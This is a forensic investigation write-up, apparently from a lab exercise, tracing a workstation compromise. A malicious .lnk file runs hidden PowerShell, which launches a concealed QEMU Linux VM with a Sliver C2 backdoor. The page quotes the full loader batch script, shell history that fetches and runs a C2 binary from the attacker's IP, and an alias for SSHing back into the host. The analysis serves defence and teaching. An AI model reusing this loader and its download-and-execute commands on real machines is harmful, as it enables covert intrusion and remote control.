+<h3 id="investigation">Investigation</h3>
+<h4 id="initial-investigation">Initial Investigation</h4>
+<p>The investigation was initiated by examining common directories such as Desktop, Downloads, Temp, and Documents. This analysis was conducted by parsing the MFT attribute to retrieve the entry numbers for each folder, enabling filtering for specific content.</p>
+<h4 id="analysis-of-suspicious-downloads">Analysis of Suspicious Downloads</h4>
+<p>In the Downloads folder, a 150MB zip file was identified, accompanied by a link file created simultaneously and bearing the same name. Since this discovery matched the alert criteria, the investigation timeline was established at this point.</p>
+<p><img alt="Downloads Directory" src="img/downloadsContent.png" /></p>
+<p>The download of the zip and lnk files was recorded at <code>2024-11-28 11:59:02</code> UTC. The timing of the link file's execution was then investigated to determine subsequent actions. Due to the nature of the <code>.lnk</code> file, the exact execution time could not be located in the <code>recentdoc</code>s or the <code>lnk</code> files under <code>Roaming\Microsoft\Windows\Recent</code>. The <code>userassist</code> registry keys were examined to check if it got executed as a process not a file, revealing the file’s last execution time as <code>2024-11-28 12:01:35</code> UTC.</p>
+<p><img alt="Userassist keys" src="img/userassist.png" /></p>
+<p>An attempt was made to extract the content of the link file from the MFT; however, the file was not found. This absence was attributed to the size of the link file exceeding <code>1KB</code>.</p>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>The <code>$MFT</code> attribute file only retains actual file data if the size is <code>1024</code> bytes or smaller (resident data). For files larger than <code>1KB</code>, the data becomes non-resident and is not stored in the MFT itself, though data runs to the file’s location are recorded. </p>
+</div>
+<p>Prefetch files were parsed for processes executed around the identified time to analyze activities following the link file’s activation.</p>
+<p><img alt="Powershell First Prefetch" src="img/prefetchFirst.png" /></p>
+<p>It was discovered that <code>Powershell.exe</code> and <code>Conhost.exe</code> were executed at the exact time of the link file activation. Additionally, other processes, including <code>edge</code>, <code>qemu</code>, and <code>whoami</code>, were executed shortly afterward.</p>
+<p><img alt="Suspicous Prefetch Executions" src="img/prefetchSus.png" /></p>
+<p>Attention was first directed toward <code>powershell.exe</code> to determine if the link file contained embedded PowerShell commands. Using the timeline, PowerShell commands executed at the corresponding time were located.</p>
+<p><img alt="PowerShell Command in Event log" src="img/CommandEventLog.png" /></p>
+<pre><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -c Expand-Archive -Path $home\downloads\'OneAmerica Survey.zip' -DestinationPath $home\datax; Invoke-Command {cmd.exe /c $home\datax\data\start.bat}
+</code></pre>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>The command extracted the contents of the zip file to <code>C:\Users\&lt;username&gt;\datax\</code> and subsequently executed a batch script named <code>start.bat</code>.</p>
+</div>
+<p>The entry number of the <code>datax</code> folder was retrieved to examine its contents. Within the <code>datax</code> folder, a subfolder named data was found, containing multiple files. These files included <code>qemu</code> and its dependencies: <code>start.bat</code>, <code>tc.img</code>, and a file named <code>usercontext.txt</code>.</p>
+<p><img alt="Zip File Extracted Content" src="img/dataxFolder.png" /></p>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p><strong>QEMU</strong> is an open-source emulator and virtualization tool used to run virtual machines or simulate hardware architectures. The <code>tc.img</code> file is likely a disk image for Tiny Core Linux, a minimal Linux distribution often used in lightweight virtual environments.</p>
+</div>
+<p>Efforts were made to determine the content of <code>start.bat</code> and <code>usercontext.txt</code> and to recover both files. The size of start.bat was noted as <code>580</code> bytes, and <code>usercontext.txt</code> was identified as <code>7</code> bytes. A hex editor was utilized, and the MFT attribute was analyzed by searching for the file names.</p>
+<p><img alt="batch file content" src="img/batchFileContent.png" /></p>
+<pre><code>@ECHO OFF
+
+REM Define the target directory and ensure it exists
+set "targetDir=%HOMEPATH%\datax\data"
+if not exist "%targetDir%" mkdir "%targetDir%"
+
+REM Create and write user context information to usercontext.txt
+(
+    echo %USERNAME%
+
+) &gt; "%targetDir%\usercontext.txt"
+
+explorer.exe https://forum.hestiacp.com/uploads/default/original/2X/9/9aae76309a614c85f880512d8fe7df158fec52cc.png
+START /B %HOMEPATH%\datax\data\qemu.exe -drive file=%HOMEPATH%\datax\data\tc.img -fw_cfg name=opt/usercontext,file=%HOMEPATH%\datax\data\usercontext.txt -nographic &amp;
+
+exit
+</code></pre>
+<ul>
+<li>
+<p>Explanation:</p>
+<ul>
+<li>The directory <code>%HOMEPATH%\datax\data</code> was defined and created if it did not exist.</li>
+<li>The username of the machine was saved in a file named <code>usercontext.txt</code>.</li>
+<li>A URL was opened in the browser, displaying an error message hosted on a public server
+    <img alt="Internal Server Error" src="img/internalservererror.png" /></li>
+<li><code>QEMU</code> was started in the background to run an emulated environment, loading the virtual disk <code>tc.img</code>.</li>
+<li>Custom firmware configuration was added to allow the emulated environment to access <code>usercontext.txt</code> from the host.</li>
+<li>The emulation was run in the background, making it invisible to the user except for the displayed error message.</li>
+</ul>
+</li>
+</ul>
+<p>The content of usercontext.txt was also recovered and found to store the username a1l4m, confirming the username of the machine.
+    <img alt="usercontext.txt" src="img/usercontext.txt.png" /></p>
+<p>Next, the browser history was examined to verify whether the error message had been displayed to the user. This was achieved by analyzing the <code>History</code> database located in <code>C:\Users\a1l4m\AppData\Local\Microsoft\Edge\User Data\Default</code>. The URL was confirmed to have been accessed at <code>2024-11-28 12:03:10</code> UTC.
+    <img alt="Browser History" src="img/browser-error.png" /></p>
+<p>It was observed that the attacker proceeded with activities within the emulated environment after <strong>QEMU</strong> started at <code>2024-11-28 12:03:08 UTC</code>. Processes such as <code>cmd</code>, <code>SSHD</code>, and <code>whoami</code> were identified for further investigation. It was hypothesized that all these actions were conducted within the emulated environment created on the workstation.
+<img alt="Suspicous Prefetch Executions" src="img/prefetchSus.png" /></p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Due to the nature of QEMU, it was determined that no logs would be available for actions taken within the emulated environment. All activities occur in memory and are cleared upon shutdown of the emulation. Consequently, the next phase of the investigation focuses on memory forensics.</p>
+</div>
+<h4 id="memory-analysis">Memory Analysis</h4>
+<p>The investigation began by examining the memory for processes to locate <code>qemu.exe</code> and verify whether the findings from the prefetch matched the data in memory.</p>
+<pre><code>└──╼ #vol -f WIN-NP10IHJMV3O-20241128-121124.raw windows.pstree 
+PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime
+
+................................
+................................
+4976    5988    qemu.exe        0xdc8dd2b25300  6       -       1       False   2024-11-28 12:03:08.000000      N/A
+</code></pre>
+<p>The process qemu.exe was identified with PID <code>4976</code>. Its parent process was missing, likely due to termination. The creation time matched the prefetch data, confirming the findings.</p>
+<p>The <code>cmdline</code> plugin was utilized, and the same commands observed earlier in the batch file and PowerShell history were retrieved.</p>
+<pre><code>└──╼ #vol -f WIN-NP10IHJMV3O-20241128-121124.raw windows.cmdline
+PID      Process                Args
+
+................................
+................................
+4752    msedge.exe      "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --single-argument https://forum.hestiacp.com/uploads/default/original/2X/9/9aae76309a614c85f880512d8fe7df158fec52cc.png
+4976    qemu.exe        \Users\a1l4m\datax\data\qemu.exe  -drive file=\Users\a1l4m\datax\data\tc.img -fw_cfg name=opt/usercontext,file=\Users\a1l4m\datax\data\usercontext.txt -nographic
+................................
+................................
+</code></pre>
+<h4 id="network-connections-and-backdoor-identification">Network Connections and Backdoor Identification</h4>
+<p>The attacker’s method of controlling the emulated environment from outside the network was then investigated using the <code>netscan</code> plugin.</p>
+<pre><code>└──╼ #vol -f WIN-NP10IHJMV3O-20241128-121124.raw windows.netscan
+Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created
+
+................................
+................................
+0xdc8dd63f8010  TCPv4   192.168.2.128   49750   3.69.168.214    8888    ESTABLISHED     4976    qemu.exe        2024-11-28 12:03:54.000000
+................................
+0xdc8dd25dca60  TCPv4   127.0.0.1       49759   127.0.0.1       22      ESTABLISHED     4976    qemu.exe        2024-11-28 12:06:32.000000
+................................
+0xdc8dd2db1b60  TCPv4   127.0.0.1       22      127.0.0.1       49759   ESTABLISHED     5656    sshd.exe        2024-11-28 12:06:32.000000
+</code></pre>
+<p>A connection from <code>qemu.exe</code> to the IP address <code>3.69.168.214</code> on port <code>8888</code> was identified. This connection likely indicates a backdoor planted on the custom image by the attacker to execute upon startup of the image.</p>
+<h4 id="customization-of-the-qemu-image">Customization of the QEMU Image</h4>
+<p>The scope was narrowed further by dumping the <code>qemu.exe</code> process using the memmap plugin.</p>
+<pre><code>└──╼ #vol -f WIN-NP10IHJMV3O-20241128-121124.raw -o . windows.memmap --dump  --pid 4976
+
+................................
+0xf8054b1de000  0x72cd1000      0x1000  0x1b816000      pid.4976.dmp
+</code></pre>
+<p>The dumped process was filtered for the IP address, revealing the complete URL used for the connection.</p>
+<pre><code>└──╼ #strings pid.4976.dmp | grep -i '3.69.168.214'
+
+mtls://3.69.168.214:8888mtls://3.69.168.214:8888
+mtls://3.69.168.214:8888060102150405Z0700
+3.69.168.214:8888
+mtls://3.69.168.214:8888XXX_InternalExtensions
+</code></pre>
+<p>A quick search was conducted to identify whether the attacker was utilizing a public C2 framework. 
+    <img alt="C2 Google Search" src="img/C2-Google-Search.png" /></p>
+<p>The search confirmed that the attacker employed <strong>Sliver C2</strong>.</p>
+<p>The memory analysis was continued using common keywords such as <code>.ash_history</code>, <code>http://</code>, and <code>wget</code>. The following results were obtained:</p>
+<pre><code>└──╼ #strings pid.4976.dmp | grep -i 'http://'
+
+................................
+wget http://3.69.168.214/LESSER_VISCOSE
+wget http://3.69.168.214/LESSER_VISCOSE
+http://
+</code></pre>
+<p>A file named <code>LESSER_VISCOSE</code> was identified as having been downloaded. Filtering further for <code>LESSER_VISCOSE</code> revealed the following:</p>
+<pre><code>└──╼ #strings pid.4976.dmp | grep -i 'LESSER_VISCOSE'
+
+................................
+wget http://3.69.168.214/LESSER_VISCOSE
+chmod +x LESSER_VISCOSE
+mv LESSER_VISCOSE lnit
+wget http://3.69.168.214/LESSER_VISCOSE
+chmod +x LESSER_VISCOSE
+mv LESSER_VISCOSE lnit
+LESSER_VISCOSE
+</code></pre>
+<p>It appeared that during the setup of the attacker’s custom image, commands had been left in the <code>.ash_history</code> file. These commands indicated that <code>LESSER_VISCOSE</code> was downloaded, renamed to <code>lnit</code> (a name similar to <code>init</code>), and made executable. This file was likely the binary for the <strong>Sliver C2 framework.</strong></p>
+<p>Further exploration of strings surrounding <code>LESSER_VISCOSE</code> revealed commands from <code>.ash_history</code>:</p>
+<pre><code>└──╼ #strings pid.4976.dmp | grep -i 'LESSER_VISCOSE' -C10
+
+................................
+filetool.sh -b
+cd /
+cat nohup.out
+sudo cat nohup.out
+history
+cd /home
+cd tc/
+wget http://3.69.168.214/LESSER_VISCOSE
+chmod +x LESSER_VISCOSE
+mv LESSER_VISCOSE lnit
+sudo nano /opt/bootlocal.sh
+filetool.sh -b
+[10.0.2.2]:2222 ssh-rsa
+</code></pre>
+<p>It was observed that the attacker used nano to edit <code>/opt/bootlocal.sh</code>, indicating that the C2 binary was configured to execute on boot. This matched the timeline, as the connection to the C2 was initiated at <code>2024-11-28 12:03:54</code> UTC when <code>QEMU</code> started.
+    <img alt="Qemu Prefetch Executions" src="img/qemu-prefetch.png" /></p>
+<pre><code>└──╼ #vol -f WIN-NP10IHJMV3O-20241128-121124.raw windows.netscan
+Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created
+
+................................
+................................
+0xdc8dd63f8010  TCPv4   192.168.2.128   49750   3.69.168.214    8888    ESTABLISHED     4976    qemu.exe        2024-11-28 12:03:54.000000
+</code></pre>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>The command <code>filetool.sh -b</code> was identified as part of the Tiny Core Linux image, used for saving the state of the image after rebooting. This supports the hypothesis that the commands found were written during the customization of the image, not during the attack.</p>
+</div>
+<h4 id="using-the-emulated-environment-to-connect-to-the-host">Using the Emulated Environment to connect to the host</h4>
+<p>Further investigation focused on the shared folder <code>usercontext</code> created by the attacker when booting the image:</p>
+<pre><code>└──╼ #strings pid.4976.dmp | grep  'usercontext'
+
+................................
+................................
+alias get-host-shell="ssh $(sudo cat /sys/firmware/qemu_fw_cfg/by_name/opt/usercontext/raw)@10.0.2.2"
+alias get-host-user="echo $(sudo cat /sys/firmware/qemu_fw_cfg/by_name/opt/usercontext/raw)"
+................................
+bash-5.2# cat /sys/firmware/qemu_fw_cfg/by_name/opt/usercontext/raw
+</code></pre>
+<p>It was found that the attacker used these commands to extract the username of the host machine and share it within the emulated environment. This username was later used to attempt <strong>SSH access</strong> into the host machine using a command such as <code>sudo ssh a1l4m@10.0.2.2</code>. According to <strong>QEMU</strong> documentation, <code>10.0.2.2</code> is the default IP address of the host.</p>
+<p>The success of this SSH command was verified using the <code>netscan</code> plugin:</p>
+<pre><code>└──╼ #vol -f WIN-NP10IHJMV3O-20241128-121124.raw windows.netscan
+Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created
+
+................................
+................................
+0xdc8dd25dca60  TCPv4   127.0.0.1       49759   127.0.0.1       22      ESTABLISHED     4976    qemu.exe        2024-11-28 12:06:32.000000
+................................
+0xdc8dd2db1b60  TCPv4   127.0.0.1       22      127.0.0.1       49759   ESTABLISHED     5656    sshd.exe        2024-11-28 12:06:32.000000
+</code></pre>
+<p>An SSH connection was established between the emulated environment (<code>qemu.exe</code>) and the host machine (<code>sshd.exe</code>) at <code>2024-11-28 12:06:32</code> UTC. The use of a loopback IP (<code>127.0.0.1</code>) ensured that this connection was not flagged as malicious by network monitoring tools.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p><code>127.0.0.1:49759 -&gt; 127.0.0.1:22</code>: The client (qemu.exe) uses source port <code>49759</code> to connect to the SSH daemon (sshd.exe) on port <code>22</code>.</p>
+</div>
+<ul>
+<li>
+<p>Each line represents one end of the same TCP connection:</p>
+<ul>
+<li>The first entry represents the client (qemu.exe) initiating the connection.</li>
+<li>The second entry represents the server (sshd.exe) responding to the client.</li>
+</ul>
+</li>
+</ul>
+<p>This confirmed that SSH communication was successfully established between the emulated environment and the host machine. Additional leads, such as the existence of <code>whoami</code> in the prefetch files, were also followed for further analysis.</p>
+<p>To determine the commands executed within the SSH shell, filtering was conducted for <code>whoami</code>. The following results were retrieved:</p>
+<pre><code>└──╼ #strings  pid.4976.dmp | grep -i "whoami" -A8
+
+whoami
+systeminfo
+hfkjh
+cd De
+echo "Khaled
+a1l4m was here" &gt; pwned.tt
+</code></pre>
+<p>It was observed that after executing <code>whoami</code>, the attacker issued multiple commands, including <code>systeminfo</code>. A file named <code>pwned.tt</code> was created with the content <code>Khaled a1l4m was here</code>, likely as a marker or note of compromise.</p>
+<p>To ensure accuracy, the triage image was revisited to validate certain findings, such as the SSH connection. The successful connection was confirmed, as shown below:
+    <img alt="SSHD Successfull Connection" src="img/sshd-connection.png" /></p>
+<hr />
+<h3 id="timeline-breakdown">Timeline Breakdown</h3>
+<p>Using all the information provided, the following timeline of the attack has been constructed:</p>
+<table>
+<thead>
+<tr>
+<th>Timestamp (UTC)</th>
+<th>Source</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2024-11-28 11:59:02</td>
+<td>USN journal</td>
+<td>Zip file and link file downloaded.</td>
+</tr>
+<tr>
+<td>2024-11-28 12:01:35</td>
+<td>UserAssist keys</td>
+<td>Link file (<code>lnk</code>) executed, starting malicious activity.</td>
+</tr>
+<tr>
+<td>2024-11-28 12:03:08</td>
+<td>Prefetch file</td>
+<td><code>Powershell.exe</code> and <code>Conhost.exe</code> executed, starting command execution.</td>
+</tr>
+<tr>
+<td>2024-11-28 12:03:10</td>
+<td>Browser history</td>
+<td>Error message URL opened in the browser (<code>msedge.exe</code>).</td>
+</tr>
+<tr>
+<td>2024-11-28 12:03:54</td>
+<td>Network scan (netscan)</td>
+<td>QEMU establishes connection to <code>3.69.168.214:8888</code>, indicating C2 communication begins.</td>
+</tr>
+<tr>
+<td>2024-11-28 12:06:32</td>
+<td>Network scan (netscan)</td>
+<td>SSH connection established between the emulated environment (<code>qemu.exe</code>) and host (<code>sshd.exe</code>).</td>
+</tr>
+<tr>
+<td>2024-11-28 12:06:32</td>
+<td>SSH commands</td>
+<td>Commands executed: <code>whoami</code>, <code>systeminfo</code>, and creation of <code>pwned.tt</code> file on host.</td>
+</tr>
+</tbody>
+</table>
+<h4 id="additional-insights">Additional Insights:</h4>
+<ol>
+<li><strong>Custom QEMU Image Configuration:</strong></li>
+<li>During the setup of the image, commands were added to download the Sliver C2 binary (<code>LESSER_VISCOSE</code>), renamed to <code>lnit</code>, and set as executable.</li>
+<li>
+<p>The binary was configured to execute on boot through modifications to <code>/opt/bootlocal.sh</code>.</p>
+</li>
+<li>
+<p><strong>Host Compromise Evidence:</strong></p>
+</li>
+<li>SSH credentials were retrieved from <code>usercontext.txt</code>, and the default IP (<code>10.0.2.2</code>) was used to establish SSH communication with the host.</li>
+<li>Indicators of compromise include a backdoor connection (<code>3.69.168.214:8888</code>) and executed commands (<code>whoami</code>, <code>systeminfo</code>).</li>
+</ol>
+<h4 id="observations">Observations:</h4>
+<ul>
+<li>The attacker utilized loopback (<code>127.0.0.1</code>) for SSH communication, ensuring stealth by avoiding external detection.</li>
+<li>All activities in the emulated environment occurred in memory, reinforcing the need for advanced memory forensics.</li>
+</ul>
+<h3 id="conclusion">Conclusion</h3>
+<p>In this investigation, a thorough forensic analysis was conducted to uncover the attacker's activities, methods, and tools used to compromise the workstation. The findings revealed the sophisticated use of a custom QEMU emulated environment to execute malicious activities while evading host-based detection. Key discoveries include the use of the Sliver C2 framework, SSH tunneling through loopback IP for stealth, and persistence mechanisms embedded in the QEMU image.</p>
+<p>The attacker demonstrated an advanced understanding of system architecture by leveraging memory-only operations and creating an isolated virtual environment for command execution. Evidence of reconnaissance, backdoor installation, and markers left on the host was uncovered through detailed memory forensics, timeline analysis, and artifact recovery.</p>
+<p>This investigation highlights the importance of incorporating advanced detection tools and processes, such as memory forensics, network traffic analysis, and host activity monitoring, to counteract sophisticated adversaries. The report's findings serve as a foundation for improving security measures and ensuring robust incident response capabilities.</p>
+<h3 id="additional-resources">Additional resources</h3>
+<ol>
+<li><a href="https://wiki.qemu.org/Documentation/Networking">Qemu Documentation for Networking</a></li>
+<li><a href="https://jieliau.medium.com/chisel-tool-for-your-lateral-movement-dd3fb398c696">Chisel for Lateral movement</a> </li>
+<li><a href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/">ragnar locker ransomware incident</a></li>
+<li><a href="https://a1l4m.medium.com/understanding-threat-actors-how-they-infiltrate-systems-d8220e3f7e90">Understanding Threat Actors</a></li>
+<li><a href="https://www.youtube.com/watch?v=LsoieQeY7g">Anti-forensics Techniques Used By Threat Actors In The Wild - Hela Lucas</a></li>
+<li><a href="https://www.securonix.com/blog/crontrap-emulated-linux-environments-as-the-latest-tactic-in-malware-staging/">crontrap emulated linux environments as the latest tactic in malware staging</a></li>
+</ol>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": ".", "features": [], "search": "assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+    
+  </body>
+</html>
